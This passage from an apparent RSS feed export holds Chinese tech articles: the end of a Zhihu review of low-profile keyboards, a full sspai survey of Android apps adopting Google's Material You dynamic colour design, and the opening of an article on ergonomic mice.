data-tags=\"qrcode\"></p>\n<p>1000以下唯一可以买到的双模cherry矮轴键盘。</p>\n<p>这把键盘国内已经快退市了。SK621买的时候搜都不好搜，JD完全搜不到。</p>\n<p>这把键盘开箱的时候就给我很大的惊喜，包装非常的好，并且还附送了一个收纳袋。</p>\n<p>具体硬件参数请参考之前的表格。</p>\n<p>4.0和5.0的蓝牙在使用上并没有什么区别，在我的使用环境下都一切正常，并且也没有感受到按键延迟与连击。</p>\n<p>手感方面，cherry的矮红轴键程比别的矮轴长，用起来更接近常规的机械键盘。</p>\n<p>键盘没有额外的脚撑，使用起来的默认高度并没有任何的不适。</p>\n<p>价格略高，并且国内接近退市，不推荐入手。</p>\n<h2>雷神璃月 KC3094</h2>\n<p>雷神这把矮轴应该是让我比较惊喜的一个。</p>\n<p>由于是新品，预售+发货，最后才收到这把。看了详情页知道通体是阳极铝，249的价格</p>\n<p>是这几把键盘最便宜的一个，也就没期待它的质感。</p>\n<p>又看到了下图，廉价的渲染让我完全没有一丝期待，甚至觉得太杀马特了。。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2547d8dc8a3be874cf95897a82b566d3_720w.jpg?rss\" data-rawwidth=\"502\" data-rawheight=\"520\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2547d8dc8a3be874cf95897a82b566d3\" data-watermark-src=\"v2-f816defe82f23569aded44c4c8267273\" data-private-watermark-src=\"\"></p>\n<p>开箱的时候和预期一样，包装非常的简陋，除了键盘之外，里边只有一根数据线和一本说明书。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-724ef4a6f9580f016eb1ec7dcd2c0f7f_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-724ef4a6f9580f016eb1ec7dcd2c0f7f\" data-watermark-src=\"v2-898e551a283040ba98e13121113d5b0e\" data-private-watermark-src=\"\"></p>\n<p>把键盘从包装里拿出来的时候就感觉有点和想象的不一样了，整体的阳极颜色是接近苹果的深空灰色，搭配类肤材质的喷油键帽，整体观感触感都很棒。</p>\n<p>键盘非常的薄，最厚的位置只有2cm，放在桌面上看起来非常的商务。</p>\n<p>侧边的灯条没有渲染图上那么夸张，RGB跑马灯模式和这把键盘不太搭，单色模式在暗光环境下下可以起到很棒点缀的作用。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-bde3391a19cce08101d4acfb5f654174_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bde3391a19cce08101d4acfb5f654174\" data-watermark-src=\"v2-758bb3a47fb86f835a8aaf24fc638e4c\" data-private-watermark-src=\"\"></p>\n<p>手感方面，类肤的材质用起来非常的舒服，键帽与手指的接触面积也足够的大，打字非常的轻松。缺点就是按键容易油乎乎的。</p>\n<p>又是一把不需要适应的矮轴键盘，非常推荐新手朋友入手。</p>\n<p><br></p>\n<p>最后，感谢你能看到这里。</p>\n<p>：)</p>\n<hr>\n<p>我是 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/46a389fe3d4368fd1371ec3069be1267\" data-hash=\"46a389fe3d4368fd1371ec3069be1267\" data-hovercard=\"p$b$46a389fe3d4368fd1371ec3069be1267\">@Domino</a> </p>\n<p>机械键盘发烧友、产品经理。一个在外设道路上不断折腾的八年萌新。</p>\n<p>佛系知乎答主，科技盐究员，好物推荐官。</p>\n<p>性别男爱好键盘，喜欢任何有理有据的探讨与交流。</p>\n<p>希望我的分享可以帮助更多的朋友，</p>\n<p>欢迎关注。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ouiwop?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Domino</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/23598328/answer/2157019005?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">101 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/375101699?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">300左右有什么好的办公键盘推荐？</a><br><a href=\"http://www.zhihu.com/question/358503052?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">茶轴有什么好的键盘推荐？</a><br>\n","link":"http://www.zhihu.com/question/23598328/answer/2157019005?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"Android 平台的颜值标杆：Material You 应用大赏","date":"2021-10-06 07:00:00","description":"\n<p>如果说要罗列出 Android 12 最令人印象深刻的几大变化，Google 基于全新设计语言 Material You 为 Google Pixel 打造的这套新 UI 一定是其中之一。在 Pixel 设备所搭载的 Android 12 中，更换一张壁纸就能让整个系统 UI 焕然一新，从锁屏时间的字体颜色、启动器的图标、搜索框按钮，到通知中心、快速设置面板开关。甚至连摆在桌面的小部件（widget），都能通过适配 Android 12 的 <a href=\"https://developer.android.com/about/versions/12/features/widgets#dynamic-colors\" target=\"_blank\">应用动态颜色</a>，根据在桌面上的摆放位置呈现实时背景色效果。</p>\n<p>更重要的是，为了不让这套以壁纸取色为核心的个性化定制系统仅仅停留在 Android 系统表面，Google 在努力用 Pixel 机型「打样」的同时，也积极推动着 Material You 在自家应用中的适配。在 Android 12 正式版源码提交至 AOSP 之际，我们为大家整理了目前（截至 2021 年 10 月 6 日）已经适配了 Material You 设计的 Android 应用。</p>\n<h2>Google 应用</h2>\n<h3>基础通讯三件套</h3>\n<p>虽然是智能手机的「基础设施」，Google 自家的电话、通讯录和短信应用跟进 Material You 的速度却并不算快，适配程度也可以说是参差不齐。</p>\n<p>通讯录中，搜索框、<a href=\"https://developer.android.com/guide/navigation/navigation-ui?hl=zh-cn#add_a_navigation_drawer\" target=\"_blank\">左侧抽屉式导航</a>、右上角视图过滤菜单、应用设置的标题栏等区域都会采用从桌面壁纸提取到的配色作为点缀，Material Design 标志性的 <a href=\"https://developer.android.com/guide/topics/ui/floating-action-button?hl=zh-cn\" target=\"_blank\">悬浮操作按钮</a>（FAB）在应用动态颜色的同时，形状也从以往的圆形变成了圆角矩形。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp2db34teh5fkvn80.png\"></figure><p>而在拨号应用中，拨号键盘收起时右下角的悬浮操作按钮也用上了同样风格的圆角矩形按钮，不同层级悬浮操作按钮也用不同的动态颜色进行了视觉区分；除了同样应用于搜索框背景、高亮选中背景、设置界面背景等区域的动态配色外，拨号应用的 <a href=\"https://developer.android.com/guide/navigation/navigation-ui?hl=zh-cn#bottom_navigation\" target=\"_blank\">底部导航栏</a> 也通过采用不同动态颜色的图标和背景，营造出了更有层次感的底部导航栏设计。</p>\n<p>作为 Google 自家规范适配一直以来的「盲区」<sup class=\"ss-footnote\" href=\"\" title=\"虽然 Google 从 Pixel 3 XL 开始就有搭载异形屏的硬件存在了，但 Google 拨号应用的通话界面至今没有支持刘海屏。\" footnote-id=\"1\">1</sup>，拨号应用连最为基础的<strong> </strong><a href=\"https://sspai.com/post/65930#:~:text=%E8%87%AA%E9%80%82%E5%BA%94%E5%9B%BE%E6%A0%87-,%E6%9B%B4%E9%80%82%E5%90%88%E5%85%A8%E9%9D%A2%E5%B1%8F%E7%9A%84%E5%BA%94%E7%94%A8%E8%AE%BE%E8%AE%A1,-%E4%BB%8E%E6%9C%BA%E6%A2%B0%E5%BC%8F\" target=\"_blank\">边到边</a><strong> </strong>适配都没有，浅色主题下顶部状态栏和底部导航栏背景始终为白色，视觉效果令人感到不适。但这里的底部导航栏新样式，和上面提到的动态颜色、圆角矩形悬浮操作按钮一起，构成了 Google 自家应用 Material You 的核心风格。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp2lb34teh0gc1nrg.png\"></figure><p>至于信息应用，截至发稿时，Google 仅对应用主界面右下角的悬浮操作按钮进行了更新，同样是由圆变方，在信息列表中滚动浏览时，悬浮操作按钮会根据滑动方向在扩展形态和精简形态间切换；设置项目得到了重新整理，更加清晰明了。但除此之外信息应用的更新就可以说是乏善可陈了，我们甚至看不到半点动态颜色的影子，无论桌面壁纸如何，应用内均采用蓝色为默认颜色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp2tb34teh3cl8vo0.png\"></figure><h3>日历</h3>\n<p>同样作为基础应用的 Google 日历在 Material You 适配上做得出色得多：从桌面提取到的动态颜色从主界面、设置标题栏，主、次悬浮操作按钮一直延伸到左侧抽屉式导航和设置，日程视图中的当前日期标记、活动卡片（默认样式）等控件，也都采用了不同取值的动态颜色进行点缀，看上去和谐又不失变化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp3db34teh3cl8vog.png\"></figure><p>更重要的是，Google 日历在桌面小组件中也同样运用了 Material You 动态颜色，视桌面摆放位置的不同，小部件标题栏的颜色也会动态改变。总体来说日历应用算是将新设计诠释得比较到位的适配案例之一。</p>\n<h3>Chrome</h3>\n<p>Chrome 在功能和设计上一直以来都可以说是保守而谨慎，在升级到 Chrome 94 及以上版本后，使用 Android 12 的用户应该也看到一些新变化<sup class=\"ss-footnote\" href=\"\" title=\"如果你没有看到，也可以通过 chrome://flags 中开启 #dynamic-color-android 和 #theme-refactor-android 两项开关来手动激活\" footnote-id=\"2\">2</sup>：主界面的搜索框、地址栏和快速访问标签，浏览网站时的标题栏，多标签页管理界面的标签页边框等界面都通过提取并适配了不同的动态颜色，多标签页管理页面的标签页卡片也采用了更加圆润的圆角设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp3lb34teh3cl8vp0.png\"><figcaption>Chrome 94.0.4606.50 开启上述功能标签后的效果</figcaption></figure><p>除此之外 Chrome 浏览器几乎就没做太多设计上的适配了，连浏览器设置界面都还是老样子。</p>\n<h3>计算器</h3>\n<p>随 Android 12 Beta 5 搭载的新版计算器正式采用了 Material You 设计风格，这款系统小工具的视觉观感也因此得到了巨大的提升。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp45b34teit0pn4i0.png\"></figure><p>首先是颜色，通过不同的动态颜色取值，计算器不同区域、不同按键之间在保留层次感的同时也有了对系统整体色彩风格的呼应，如果你将 Android 12 动态颜色的彩蛋小部件添加到桌面并完全展开，会发现计算器主界面基本都是提取的 N1、N2 和 A1、A2 相近色列，全部清除（AC）这种需要谨慎操作的按钮则直接取到了 A3 列进行强调。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp4tb34teh3cl8vpg.png\"></figure><p>除了颜色，计算器按钮由方变圆，计算结果、计算历史区域也通过柔和的圆角边缘和相近色取值进行了区分。</p>\n<h3>时钟</h3>\n<p>在 Android 12 Beta 5 中随计算器一起加入 Material You 套餐的还有时钟应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp55b34teh5fkvn8g.png\"></figure><p>虽然时钟应用依然默认采用深色主题且不可更改，但应用内 Material You 适配全面，除了开关、按钮、底部导航图标和选中时的强调背景等区域大量提取、运用了动态颜色外，闹钟在关闭、激活状态下的字重变化，圆角卡片以及大色块圆形按钮的堆叠，都给人以强烈的视觉新鲜感。</p>\n<p>另外时钟小组件也同步迎来了更新，除了 3 款不同样式的数字时钟外，此前在 Android 12 亮相视频中圈粉无数的多边形模拟时钟也包含在内，这些组件放置在桌面时依然可以根据摆放位置的不同动态变换颜色。</p>\n<h3>文件极客</h3>\n<p>虽然从设计规则上来说文件极客可以说是 Google 自家应用中「打脸」一般的存在<sup class=\"ss-footnote\" href=\"\" title=\"因为在 Material Design 的 设计规范 中明确指出少于 3 个标签页面时不要使用底部导航栏设计。\" footnote-id=\"3\">3</sup>，但这款应用依然跟随 Android 12 进行了 Material You 动态颜色的提取和应用，包括主界面的清理操作按钮、文件浏览界面的弹出菜单、底部导航栏的导航图标和导航图标选中背景等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp5lb34teh3cl8vq0.png\"></figure><p>不过整体而言文件极客的 Material You 设计适配依然可以用「破碎」二字来形容，除了对 Material Design 设计规范本身的不尊重，应用内还存在着大量跨越多个世代的「糅合」设计，不管是带有阴影的圆角矩形卡片、底部导航栏和右侧快速索引标签还是依然采用 Roboto 而不是 Google Sans 字体的文件浏览菜单，整体视觉风格都给人一种仍在换皮、依然不得 Material Design 精髓的感觉。</p>\n<h3>Google 播客</h3>\n<p>作为 Google 第一方的播客应用，Google 播客也在最近的版本中跟进了 Material You 设计风格，通过大面积应用的动态颜色提升应用与系统界面在视觉观感上的一致性。同时也用上了标志性的新式底部导航栏设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp65b34teh3cl8vqg.png\"></figure><p>不过除了动态色彩和新版底部导航栏，Google 播客应用和拨号应用一样也因为底部导航栏「变色」暴露出了没有适配边到边的问题，纯白的导航栏背景看上去具有非常明显的割裂感。另外作为 Google 的第一方播放器应用，我们也期待 Google 接下来能够拿出更多 Material You 播放器设计巧思——比如那个出现在 <a href=\"https://www.youtube.com/watch?v=UHQPdP8qgrk\" target=\"_blank\">宣传视频 </a>中、却至今没有任何 app 实装的波浪形进度条。</p>\n<h3>Google 相册</h3>\n<p>和上面提到的日历应用类似，Google 相册也可以说是 Material You 适配得比较到位的 Google 应用之一。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp6db34teh5fkvn90.png\"></figure><p>除了大量运用的动态颜色、全新样式的底部导航标签外，Google 相册主界面此前已经大量采用的圆角和卡片设计也为其增色不少，应用中的按钮、搜索框等控件也通过相近取色而非阴影的方法来体现层级，浏览相册时，时间分隔文本也采用了类似 Android 12 系统设置那样的大字体标题，兼具视觉效果和分隔效果。</p>\n<h3>相机、Google Lens</h3>\n<p>相机应用在 Android 系统中虽然是功能大于设计的存在，但 Material You 的动态颜色依然在其中起到了不俗的点缀效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp7db34teh0gc1ns0.png\"></figure><p>在 Android 12 中，相机取景器底部选中的当前拍摄模式会通过采用动态颜色的标签背景进行提示，取景器中的变焦按钮、安全相册开关以及顶部设置面板也都使用了统一提取到的动态颜色来呈现选中效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp85b34teh3cl8vr0.png\"></figure><p>与相机应用类似的，Google Lens 也已部分采用了 Material You 设计，比如取景框中的取字翻译提示。但底部功能标签依然没有跟进动态颜色适配。</p>\n<h3>Google Workspace</h3>\n<p>虽然依然保留了左侧导航抽屉，Google Drive 在可以的地方几乎都用上了从桌面壁纸提取到的动态颜色，导航栏、背景、底部弹出菜单、搜索框等不同界面的层级也通过相近色的变化体现了出来，新版底部导航栏设计和支持动态颜色的桌面小部件自然也没有缺席。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp8db34teh3cl8vrg.png\"></figure><p>Google Workspace 套件中的其它应用，如 Gmail、文档、表格、幻灯片等，也拥有了较为完整的 Material You 适配，大面积应用的动态颜色、圆角矩形样式的悬浮操作按钮一个不少，Gmail 同时还拥有全新的「四叶草」式动态色彩小部件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/64817c38c30ec50b70f1d2c4a4475d4c.jpg\"></figure><p>有意思的是 Gmail 应该也是目前唯一一款对 Material You 底部导航栏设计有着不同想法的 Google 应用。如果你在设置中开启了聊天室、Chat 等底部导航标签页面，就会发现 Gmail 的底部导航栏高度相比其它 Google 应用要更矮一点。显然 Gmail 团队认为新版底部导航栏虽然观感上视觉一新了，但屏幕利用率还可以再稍微提高一点。</p>\n<h3>Keep 笔记</h3>\n<p>Keep 笔记对 Material You 的适配主要集中在配色和小部件上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp8tb34teh3cl8vs0.jpeg\"></figure><p>应用内部，搜索框、底部操作栏和底部操作栏上的悬浮操作按钮都换上了新样式和动态颜色，主界面背景和笔记卡片上的标签，则以更浅或更深的相近取色来突出层级，美中不足的是底部操作栏上的圆角矩形悬浮操作按钮采用了阴影而非不同取色的方法来进行强调。</p>\n<p>Google Keep 也提供了新版「四叶草」小部件，可根据摆放位置自动变换颜色。</p>\n<h3>Gboard</h3>\n<p>越是明显的地方似乎就越容易被忽略，一开始我们甚至忘了将 Gboard 加进这篇文章的提纲里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp95b34teh0gc1nsg.png\"></figure><p>在 Android 12 中，Gboard 提供了新的动态颜色主题方案，开启后键盘背景、按键都会采用从壁纸提取到的颜色进行点缀。</p>\n<p>Gboard 虽小，却最能体现 Material You 的核心设计理念：根据功能和场景灵活运用不同的几何形状、用色彩对关键操作和按键区域进行强调、用色差体现层级同时尽量避免使用阴影……它应该也算是 Google 应用 Material You 设计的优秀代表之一了。</p>\n<h2>第三方应用</h2>\n<h3>Sleep as Android</h3>\n<p>Sleep as Android 是一款比较老牌的睡眠追踪应用，在版本号为 20210910 的测试版中，Sleep as Android 正式适配了 Material You 的动态颜色系统，配合主界面内大量使用的圆角矩形卡片、扩展式悬浮操作按钮以及条理清晰、层次分明的界面与设置项目，我们在 Sleep as Android 完全看不到任何「老牌」的味道。扑面而来的都是新设计的香气。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp9db34teh3cl8vsg.png\"></figure><span class=\"ss-application\" app-id=\"14361\"> </span><h3>Tasker</h3>\n<p>同样老牌的 Tasker 近年来在 Android 新特性适配这件事情上也非常积极。最新版 Tasker 依然保留着大量「牛轧糖」时代的味道，但主界面配色方案却跟进了 Material You。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehp9tb34teh5fkvn9g.png\"></figure><p>唯一要吐槽的是 Tasker 在动态颜色选取上似乎有些跳脱，同样一张壁纸，Sleep as Android 采用配色方案明显要比 Takser 好看得多。这其实也反映出了一个问题：Material You 提取到的色彩只是第一步，能否合理使用这些提取到的颜色来为应用颜值加分，还得看应用开发者的实际理解。</p>\n<span class=\"ss-application\" app-id=\"1772\"> </span><h3>DarQ</h3>\n<p>DarQ 是一款借助 root 权限、为不支持深色主题的应用（比如 Handshaker ）强行开启深色界面的小工具。 在 6 月末的 <a href=\"https://github.com/KieronQuinn/DarQ/releases/tag/2.0\" target=\"_blank\">2.0 版本</a> 中，DarQ 就已经加入了对 Material You 色彩系统的支持，经过 7 月初 2.1 版本的小修小补之后，目前它在 Android 12 上的使用体验已经相当完善。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpa5b34teit0pn4ig.png\"></figure><p>值得一提的是 DarQ 作为一款工具应用，在应用设置的设计上也尽量向 Android 12 的系统设置看齐，顶部标题栏采用了大面积的留白、功能总开关也与系统设置的新样式保持一致，最大程度消弭了第三方工具与系统设置在视觉上的差异。</p>\n<h3>Inware</h3>\n<p>Inware 是一款类似 AIDA64 的系统信息检测工具，与 AIDA64 繁冗的设计相比， Inware 的 UI 更加现代一些，用一部分信息量的牺牲换取了更好的易读性。</p>\n<p>在最新的 Inware 测试版中，进入主界面右上角的软件设置，在外观菜单中便可以找到一个名为 Use system colors 的开关，将它打开之后就可以让 Inware 的配色方案与系统壁纸匹配。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpalb34teh5fkvna0.png\"></figure><span class=\"ss-application\" app-id=\"16179\"> </span><h3>质感文件</h3>\n<p>与前文提到的文件极客不同，来自第三方开发者的质感文件一直以来都维持着标准化的 Material Design 风格设计。因此质感文件也是首批适配了 Material You 动态颜色的第三方应用之一，只需在应用设置中开启相关开关，即可解锁完全不同于预置主题方案的全新配色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpatb34teh5fkvnag.png\"></figure><p>不过质感文件除了色彩方案的适配外目前倒是没有太多界面元素和控件上的翻新，这里不妨也期待以下这款小工具的后续更新。</p>\n<span class=\"ss-application\" app-id=\"16180\"> </span><h3>Swift Walls</h3>\n<p>Android 平台上的第三方壁纸 app 不胜枚举，但像 Swift Walls 这种同时对壁纸浏览、设置和编辑体验都同样重视的壁纸应用并不算多。Swift Walls 在最新版本中不仅适配了 Material You 的动态颜色，还大量采用了符合 Material Design 设计规范的界面控件，应用设置也向 Android 12 系统设置的整体风格看齐，视觉观感和使用体验都很不错。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpb5b34teit0pn4j0.png\"></figure><span class=\"ss-application\" app-id=\"15169\"> </span><h3>Infinity for Reddit</h3>\n<p>与 Twitter 和微博类似，社交网站 Reddit 同样通过开放相关接口的方式，为样式繁多的第三方客户端提供了展示技术和审美的机会。这其中就包括 Infinity for Reddit（下称 Infinity）。</p>\n<p>相比 Reddit 官方客户端，Infinity 在没有对主要功能布局进行改动的基础上为 app 添加了许多 Material Design 设计的风味——从 Material Design 2 时代风格的底部操作栏与居中悬浮操作按钮，到 5.0.4 版本中引入的 Material You 动态配色方案。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpblb34teit0pn4jg.png\"></figure><p>不过 Infinity 也存在和 Tasker 类似的问题，手动开启 Material You theme 开关后，它会将系统色表中几个饱和度比较高的关键色用作顶栏、底栏和信息卡片的默认背景色，看上去有些「用力过猛」了。不过 Infinity 本身也为这个问题提供了一套相当成熟的解决方案：在启用 Material You 主题开关之后，我们仍然可以手动对应用内几乎每一处颜色进行修改。</p>\n<span class=\"ss-application\" app-id=\"16181\"> </span><h3>Todoist</h3>\n<p>Google 第一方待办应用 Google Tasks 在更换新图标之余似乎没有跟进 Material You 的迹象，多次荣登少数派首页的知名 GTD 应用 Todoist 则趁机弯道超车，在 v8602 版本中为用户带来了 Material You 动态颜色支持。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpc5b34teh3cl8vt0.png\"></figure><p>值得肯定的是，Todoist 的动态主题色选项也没有放进订阅解锁区域当中，免费版用户在安装最新测试版本后也能进入设置菜单手动打开；不过目前 Todoist 的动态配色方案还没来得及适配深色主题，也无法跨平台同步到其它设备上。</p>\n<span class=\"ss-application\" app-id=\"9874\"> </span><h3>通知滤盒</h3>\n<p>通知滤盒也是少数派首页的「常客」。作为一款系统通知管理软件，它可以从另外一个角度解决垃圾短信的问题——既然收到垃圾短信是很难避免的，那么不让它们弹通知出来烦人便也曲线救国实现了「管理」的目标。</p>\n<p>在最近更新的通知滤盒 v2.1.1 中，开发者为其接入了 Material You 动态配色方案，甚至应用右下角的悬浮操作按钮也如 Google 应用一样改成了圆角矩形样式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpclb34teh3cl8vtg.png\"></figure><span class=\"ss-application\" app-id=\"15141\"> </span><h3>Tachiyomi</h3>\n<p>作为一款免费、开源的 Android 漫画阅读器，<a href=\"https://tachiyomi.org/\" target=\"_blank\">Tachiyomi</a> 一直以来也是 Material Design 的忠实追随者，其众多 <a href=\"https://tachiyomi.org/forks\" target=\"_blank\">分支</a> 也可以说是百花齐放，体现着不同开发者对于 Tachiyomi 在功能和设计上的不同理解。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpctb34teit0pn4k0.png\"></figure><p>目前 Tachiyimi 已经支持了 Material You 动态配色方案，一些优秀分支，比如 <a href=\"https://tachiyomi.org/forks/#tachiyomij2k\" target=\"_blank\">TachiyomiJ2K</a> 更是适配了 Android 12 的 SplashScreen API，拥有惊艳的开屏动画效果。</p>\n<h2>小结</h2>\n<p>在 Google Pixel 的体验中，Material You 仅仅只是 Google 为 Android 12 所设计的视觉和交互体验的一部分：以 Pixel Launcher 为出发点，Google 应用可以根据桌面壁纸套用不同色彩风格的桌面图标；从点击图标启动应用到进入应用完成主界面加载这段时间内，系统会调用 <a href=\"https://developer.android.com/reference/android/window/SplashScreen\" target=\"_blank\">SplashScreen API</a> 带来舒适、自然的闪屏动画效果；进入应用后，基于 Material You 动态色彩的设计则会将壁纸和启动器中那种熟悉的视觉观感延续到应用内部。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpe5b34teh0gc1nt0.gif\"><figcaption>从桌面图标到应用内的效果</figcaption></figure><p>回顾 Material Design 从发展至今的历程，可以说今年应该是新设计语言在 Android 平台适配速度最快、覆盖面最广的一年。借由形状、色彩和动画都更加活泼多变的 Material You，Google 也将此前宣传的 <a href=\"https://material.io/design/material-theming/overview.html#material-theming\" target=\"_blank\">Material Theming</a>（借助 Material Design 打造品牌辨识度）推向了一个新的高度。至少在今年晚些时候正式开源之前，看见类似本文出现的截图时我们都会马上反应过来——这是 Material You，这是 Google 为 Pixel 系列机型打造的 Android 12 视觉体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ehpedb34teh3cl8vug.gif\"><figcaption>Material Theming | 图：Google</figcaption></figure><p>不过目前我们看到的这套 Material You 适配方案也暴露出了一些问题。</p>\n<p>从设计上来说，Material You 在 Google 自家应用中的一些细节依然存在冲突，比如 Android 12 锁屏 PIN 码的大色块圆钮会在按下时变为圆角矩形，但同样采用大色块圆钮设计的计算器却没有采用这种反馈动画，再比如不同 Google 应用的适配程度依然参差不齐，Gmail 团队显然也对 Material You 底栏设计有着不同的看法，在后续更新的版本中对默认的底栏高度进行了微调。</p>\n<p>好消息是，虽然这套基于壁纸的取色系统最快也要等到 <a href=\"https://www.xda-developers.com/android-12-1-monet-open-source/\" target=\"_blank\">Android 12.1</a> 才会开源，在此之前 OPPO、三星等厂商也已经跟随 Android 12 进行了底层适配，但在最近放出的 One UI 4 Beta 版本中，三星已经开始回应 Google 的设计思路了（<a href=\"https://www.xda-developers.com/samsung-one-ui-4-beta-2-android-12-galaxy-s21/\" target=\"_blank\">来源</a>）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/article/bf4cbaf7584a1c7fbda65173bed2f2ff\" alt=\"One UI 4 beta 2 color theme\"><figcaption>One UI 4 中的 Material You 动态色彩适配 | 图：XDA</figcaption></figure><p>你如何看待 Material You 和现有 Google 应用中的 Material You 设计，还有哪些适配了 Material You 的好应用本文没有提到？欢迎在评论区留下你的看法。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69117"},{"title":"它或许能拯救你酸痛的手臂：浅谈人体工学鼠标","date":"2021-10-06 03:00:00","description":"\n<p>此前我曾经写过一篇介绍 <a href=\"https://sspai.com/post/67354\" target=\"_blank\">人体工学键盘</a> 的文章，而本文的主角——人体工学鼠标——与它一样，是为了减少使用者手部疲劳、延缓劳损发生而设计的。</p>\n<p>如果你了解鼠标的起源，应该就会对下图中那个靠双滚轮活动的方盒子有点印象。这是 Douglas Engelbart 在 1968 年发明的第一款「鼠标」，原本叫做「显示系统的 X-Y 座标指示器」，它代表了人机交互领域的一次全新尝试，也开启了一个全新的时代。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2g5b34teh5fkvc5g.png\"></figure><p>而后续的鼠标制造商，也或多或少地承袭这样的设计理念。在最初的几年里，机械鼠标基本维持这样方盒子的形态。随着使用的增多，使用者和厂商才意识到流线型的重要性，给鼠标套上了不同的外壳，逐渐演变成我们目前能见到的，最为基本的对称、曲线、左右主按键的设计。</p>\n<p>这样的设计其实是有隐患的。要想说清楚这一点，我们需要使用鼠标时，你胳膊的状态说起。</p>\n<h2>什么姿势对手臂最友好？</h2>\n<p>每一个关节都有自己适当的活动方向，每种活动也有一定的活动范围（活动度）。比如肩关节，作为人体最灵活的关节，它可以完成屈、伸、收、展、旋转和环转六类基本运动，六类运动组合形成日常生活中我们需要的各种复杂运动；当肩关节的外展时，最大可达 180°，而让肩关节后伸，最大就只有 60°。<sup class=\"ss-footnote\" href=\"https://web.mit.edu/tkd/stretch/stretching_8.html#SEC87\" title=\"https://web.mit.edu/tkd/stretch/stretching_8.html#SEC87\" footnote-id=\"1\">1</sup></p>\n<figure class=\"image ss-img-wrapper\"><img 